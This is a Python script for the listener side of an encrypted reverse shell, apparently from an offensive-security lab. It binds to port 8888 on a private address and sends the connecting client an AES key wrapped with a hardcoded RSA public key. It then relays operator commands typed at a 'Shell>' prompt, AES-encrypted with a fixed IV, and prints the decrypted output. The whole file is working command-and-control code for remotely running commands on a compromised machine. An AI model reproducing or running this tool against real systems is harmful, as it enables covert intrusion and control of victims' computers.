import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import string
import random

IV = b"H" * 16

key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(0, 32))

def SEND_AES(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAsEF8wKmM/PgwtmTColaK
S952gCVEDucB74WVsoJZ0crO5eVNliCZZRqwuH3FJo/LEZE8Kr+n9B07fD2SdGNX
f0Ur+km53ZKXcb89zuohwlK7hizIfzh6eAvV71IpvhVU4qr45hrqP+Ha6toThYm/
Xa7G8W65JmfCUtMCdYuute5QJJUTkGTkpt8dZ0Szdf5u2dz4KhpX2Lw9eeEDOPeP
xBiJzPRlTTnkHfjX0nnydhIKFLSJ2Up4AEVqCnm7LWltYNcEo6epcWiL3F2KtRr9
rVDs2FGe3jzu7WX9MyQIzKRQ9S7QM2k2zaLa6gdllLt6YBkNEHNE2DrVv72Pv1d2
WUq6r+9hreSSOCbzolmErPI9ljIi4XgMEbxaqf4gRhLCqnxtsXRiy+jMQ0rggjUa
8IEL61wuOMZwmjmeycE/RjOJW3xnt0QbANLY1y3abaQbgXhMwEhJzHH3QE2zm1Bc
4VLqk2vKmDQ/oYDs8FCCwUd5KivmK96lF4QXySlqST9XBYkqv1DXP1KXxMbWJiI1
5Rof/KwTwylpJI2pFXaGUL++8hqO7qtzF5GV5XAXH908l48efwCkowV+dWoSHiit
e3TJUTVxS32mx7qLLBB/dVmD4nJmbuJ5rTWWk/sNZZi4ioEU+EX3sZB4KQy6DaR7
tjoyPX6PpDXUoUg4dHFy0MkCAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def encrypt(message):
    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connecting():
    s = socket.socket()
    s.bind(("192.168.46.128",8888))
    s.listen(1)
    print ('[+] Listening for income TCP coonection on port 8888')
    conn , addr = s.accept()
    print (key.encode())
    conn.send(SEND_AES(key.encode()))

    while True:
        store = ''
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result))
            except:
                print("[-] unable to decrypt/receive data!")

def main():
    connecting()
main()
